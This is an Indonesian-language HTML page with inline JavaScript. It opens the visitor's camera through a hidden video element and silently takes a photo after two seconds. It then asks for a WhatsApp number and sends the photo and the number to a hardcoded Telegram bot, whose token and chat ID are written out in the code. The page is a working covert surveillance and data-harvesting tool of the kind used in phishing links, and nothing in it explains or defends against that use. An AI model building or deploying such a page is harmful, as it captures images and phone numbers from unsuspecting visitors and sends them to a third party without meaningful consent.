<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Ambil Foto & Kirim ke Telegram</title>
</head>
<body>
  <h2 id="status">Memuat kamera...</h2>
  <video id="video" width="300" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>

  <div id="formContainer" style="display:none;">
    <h3>Masukkan Nomor WhatsApp</h3>
    <input type="text" id="waNumber" placeholder="Contoh: 6281234567890">
    <button id="submitWa">Kirim Sekarang</button>
  </div>

  <script>
    const status = document.getElementById('status');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    let imageBlob = null;

    // Akses kamera otomatis
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // Tunggu video siap, lalu ambil foto setelah 2 detik
        video.onloadedmetadata = () => {
          status.textContent = "Mengambil foto...";
          setTimeout(() => {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
              imageBlob = blob;
              status.textContent = "Foto berhasil diambil!";
              document.getElementById('formContainer').style.display = 'block';
            }, 'image/jpeg');
          }, 2000);
        };
      } catch (err) {
        status.textContent = "Gagal mengakses kamera. Gunakan HTTPS atau localhost, dan izinkan kamera.";
        console.error(err);
      }
    }

    startCamera();

    // Kirim otomatis ke Telegram setelah masukkan nomor
    document.getElementById('submitWa').addEventListener('click', () => {
      const waNumber = document.getElementById('waNumber').value.trim();
      if (!waNumber || !imageBlob) {
        alert("Isi nomor WhatsApp dan pastikan foto berhasil diambil.");
        return;
      }

      const formData = new FormData();
      formData.append('chat_id', '7041008009');
      formData.append('caption', 'Nomor WhatsApp: ' + waNumber);
      formData.append('photo', imageBlob, 'photo.jpg');

      fetch('https://api.telegram.org/bot7548364986:AAGhIDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY/sendPhoto', {
        method: 'POST',
        body: formData
      })
      .then(res => res.json())
      .then(data => {
        alert("Foto & nomor berhasil dikirim ke Telegram!");
        document.getElementById('formContainer').innerHTML = "<p>Data sudah terkirim.</p>";
      })
      .catch(err => {
        alert("Gagal kirim ke Telegram: " + err);
        console.error(err);
      });
    });
  </script>
</body>
</html>
